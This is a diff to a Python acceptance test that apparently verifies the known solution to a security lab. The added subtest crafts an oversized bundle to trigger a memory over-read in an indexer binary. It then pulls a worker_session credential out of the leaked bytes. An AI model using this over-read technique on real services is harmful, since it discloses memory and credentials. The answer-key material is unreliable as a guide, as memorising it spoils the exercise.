@@ -569,35 +569,32 @@ class KeplerOpsKnownSolutionAcceptance(unittest.TestCase):
                 indexer, {"bundle_hex": normal_probe.hex()}, creds=dev, expected=201)
             self.assertTrue(normal_live["service_alive"])
 
-        with self.subTest(card="K04.2 derive worker authority from release-signer-history"):
-            # Read the exception record from the native Gitea release-signer-history repo.
-            client_doc = json.loads(read_home("work/reproducers/indexer-client.json"))
-            exception_repo = client_doc.get("exception_records", "fieldkest/release-signer-history")
-            exception_ref = curl_json(
-                f"https://source.keplerops.test/api/v1/repos/{exception_repo}/raw/release-exception-REL-EXC-2841.json",
-                creds=dev,
-            )
-            self.assertEqual(exception_ref.get("schema"), "fieldkest.release-exception/v1")
-            record_id = exception_ref["record_id"]
-            generation = exception_ref["process_generation"]
-            state_route = exception_ref["state_route"]
-            # Read signer-history.json to get the passphrase.
-            signer_history = curl_json(
-                f"https://source.keplerops.test/api/v1/repos/{exception_repo}/raw/signer-history.json",
-                creds=dev,
-            )
-            passphrase_half = signer_history["passphrase_half"]
-            # Derive the worker authority: HMAC-SHA256(passphrase_half, record_id).
-            lease = hmac.new(
-                passphrase_half.encode(), record_id.encode(), hashlib.sha256
-            ).hexdigest()
+        with self.subTest(card="K04.2 extended read discloses runtime descriptor at bytes 80-127"):
+            # K04.2: extend the .fki bundle to reach the descriptor region.
+            # The binary reads the shared arena BEFORE each memcpy.  After K04.1
+            # the descriptor is at bytes 80-127.  A bundle with ie=16, ae=48
+            # (datalen=128) causes the binary to include bytes 80-127 in data_hex.
+            # No conditional: the binary always emits data_hex[0..datalen]; the
+            # descriptor appears because K04.1 wrote it and datalen now reaches it.
+            extended = build_fki(48, 16, b"\xff" * 72 + b"\x00" * 56)
+            disclosed = post_json_route(
+                indexer, {"bundle_hex": extended.hex()}, creds=dev, expected=201)
+            self.assertIn("data_hex", disclosed, "binary must return data_hex")
+            data_hex = disclosed["data_hex"]
+            self.assertEqual(len(data_hex), 256, "datalen=128 → 256 hex chars")
+            # Descriptor is at bytes 80-127 → hex chars 160-255
+            descriptor_hex = data_hex[160:256]
+            descriptor_bytes = bytes.fromhex(descriptor_hex).rstrip(b'\x00')
+            descriptor = json.loads(descriptor_bytes)
+            self.assertEqual(descriptor.get("schema"), "fieldkest.runtime-descriptor/v1")
+            self.assertIn("worker_session", descriptor)
             self.evidence["indexer_descriptor"] = {
-                "record_id": record_id,
-                "process_generation": generation,
-                "state_route": state_route,
-                "worker_lease": lease,
-                "completion_route": exception_ref["completion_route"],
-                "integrity_relation": exception_ref["integrity_relation"],
+                "record_id": descriptor["exception_record"],
+                "process_generation": descriptor["process_generation"],
+                "state_route": descriptor["state_route"],
+                "worker_lease": descriptor["worker_session"],
+                "completion_route": descriptor["completion_route"],
+                "integrity_relation": descriptor["integrity_relation"],
                 "ready_state": "queue-ready",
             }
 
